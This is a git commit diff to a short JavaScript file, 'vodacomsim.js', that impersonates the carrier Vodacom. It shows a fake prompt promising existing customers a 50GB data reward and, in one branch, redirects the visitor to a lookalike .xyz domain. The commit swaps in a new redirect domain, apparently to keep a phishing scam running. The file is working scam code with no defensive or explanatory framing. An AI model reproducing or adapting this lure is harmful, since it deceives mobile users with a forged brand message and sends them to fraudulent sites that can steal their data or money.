f2d9a6e232d1353fbfb34d6d3412d2f11814c65c
bigetijazz29 <bigetijazz29@gmail.com>
2025-05-06 13:59:54 +0100

    Update vodacomsim.js

--- vodacomsim.js
+++ vodacomsim.js
@@ -2,5 +2,5 @@
 var password = 'ACTIVATE 50GB'
 password=prompt('Vodacom : Dear customer, please check if your SIM card is eligible to receive old customers data reward. to ACTIVATE 50GB, press Ok to verify now','ACTIVATE 50GB');
 if (password != 'ACTIVATE 50GB') {
-location.href='https://www.Vodacom50go.xyz/ancienne-recompense-sim';
+location.href='https://www.oldsimusers.xyz/vodacom50gb';
 }
